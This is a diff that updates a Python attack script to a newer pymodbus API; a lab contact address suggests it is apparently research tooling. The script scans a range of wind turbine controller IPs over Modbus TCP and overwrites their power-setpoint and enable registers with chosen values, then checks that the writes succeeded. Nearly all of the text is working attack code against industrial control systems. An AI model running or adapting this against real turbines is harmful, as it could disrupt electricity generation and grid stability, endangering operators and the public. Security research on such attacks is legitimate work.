@@ -2,7 +2,7 @@
 # Python code to launch active and reactive power attacks on WTGs
 # Comments to jjohns2@sandia.gov
 
-from pymodbus.client.sync import ModbusTcpClient as ModbusClient
+from pymodbus.client import ModbusTcpClient as ModbusClient
 import argparse 
 import struct
 import time
@@ -47,7 +47,7 @@ def attack():
 	for wtg_last_octet in range(ip_start, ip_stop+1, 1):
 		# print('Connecting to WTG at 192.168.100.%d' % wtg_last_octet)
 		try:
-			wtg = ModbusClient('192.168.100.%d' % wtg_last_octet, 502)
+			wtg = ModbusClient('192.168.100.%d' % wtg_last_octet, port=502)
 			wtg.connect()
 			print('Connected to WTG at 192.168.100.%d' % wtg_last_octet)
 		except Exception as e:
@@ -66,7 +66,7 @@ def attack():
 			reg_ena = 40172
 		
 		# Read and print current values
-		w_pct_rsp = wtg.read_holding_registers(reg_pct, count=1, unit=1)
+		w_pct_rsp = wtg.read_holding_registers(reg_pct, count=1)
 		#print(w_pct_rsp)
 		if not w_pct_rsp.isError():
 			w_pct = float(w_pct_rsp.registers[0]/100)
@@ -80,12 +80,12 @@ def attack():
 		print('Current Settings are Power%% = %s, Enabled = %s' % (w_pct, w_pct_ena))
 		
 		print('Writing WTG Power = %s%% [Raw = %s]' % (target_pct/100, target_pct))
-		rsp = wtg.write_registers(reg_pct, target_pct)
-		rsp2 = wtg.write_registers(reg_ena, reg_ena_value)
+		rsp = wtg.write_registers(reg_pct, [target_pct])
+		rsp2 = wtg.write_registers(reg_ena, [reg_ena_value])
 		print('Write complete. Success? %s and %s' % (not rsp.isError(), not rsp2.isError()))
 		
 		# Read and print current values
-		w_pct_rsp = wtg.read_holding_registers(reg_pct, count=1, unit=1)
+		w_pct_rsp = wtg.read_holding_registers(reg_pct, count=1)
 		#print(w_pct_rsp)
 		if not w_pct_rsp.isError():
 			w_pct = float(w_pct_rsp.registers[0]/100)
